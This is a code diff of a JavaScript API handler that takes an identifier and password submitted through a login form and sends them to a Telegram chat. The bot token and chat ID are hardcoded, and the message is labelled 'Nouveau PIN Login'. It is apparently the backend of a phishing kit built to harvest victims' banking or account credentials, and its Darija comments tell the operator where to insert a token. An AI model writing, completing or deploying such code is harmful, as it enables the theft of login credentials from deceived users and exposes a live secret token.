@@ -3,17 +3,26 @@ export default async function handler(req, res) {
     return res.status(405).json({ message: "Method not allowed" });
   }
 
-  const { id_no, password } = req.body;
+  const { 
 
-  const BOT_TOKEN = "8257299535:AAHw21OzY6yFvX_LhgiGNJqm8AM3cuVp57k"; // 👈 حط التوكن ديالك هنا
-  const CHAT_ID = "-4887362963"; // 👈 وحط الشات آي دي هنا
+    id_no,
+    password,
 
-  // الرسالة لي غتوصل للتلغرام
-  const message = `
-🔑 Nouveau PIN Login:
-- Identifiant: ${id_no}
-- Mot de passe: ${password}
-  `;
+  } = req.body;
+
+  const BOT_TOKEN = "8257299535:AAHw21OzY6yFvX_LhgiGNJqm8AM3cuVp57k";
+  const CHAT_ID = "-4887362963";
+
+  let message = "";
+
+  if  (id_no && password ) {
+    // 🟢 رسالة الكارت
+    message = `
+    🔑 Nouveau PIN Login:
+    - Identifiant: ${id_no}
+    - Mot de passe: ${password}
+    `;
+  }
 
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
@@ -26,7 +35,12 @@ export default async function handler(req, res) {
 
     res.status(200).json({ message: "✅ Envoyé avec succès" });
   } catch (err) {
-    console.error("Erreur Telegram:", err);
+    console.error(err);
     res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
+
+
+
+
+
